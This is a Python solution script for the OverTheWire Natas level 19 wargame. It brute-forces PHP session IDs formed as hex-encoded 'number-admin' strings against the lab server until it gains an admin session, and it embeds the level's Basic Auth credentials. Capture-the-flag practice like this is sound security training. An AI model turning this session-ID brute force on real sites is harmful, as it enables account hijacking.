import requests
from bs4 import BeautifulSoup

def get_try(number, username):
    text = f"{number}-{username}"
    encoded = text.encode('utf-8').hex()
    return encoded

headers = {"Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==", "Cookie": "PHPSESSID="}
users_to_test = ["admin"]
for username in users_to_test:
    for i in range(1, 641):
        pw_try = get_try(i, username)
        req_headers = headers.copy()
        req_headers["Cookie"] += pw_try
        #req_headers["Cookie"] += "3235362d61646d696e"
        params = [("debug", "")]
        result = requests.get("http://natas19.natas.labs.overthewire.org", headers=req_headers, params=params)
        print(f"Try: {i}-{username}/{pw_try}")
        soup = BeautifulSoup(result.content, "html.parser")
        div = soup.find("div", id="content")
        p = div.find("p")
        p.decompose()
        text = div.get_text()
        print(text)
        if "You are an admin" in text:
            break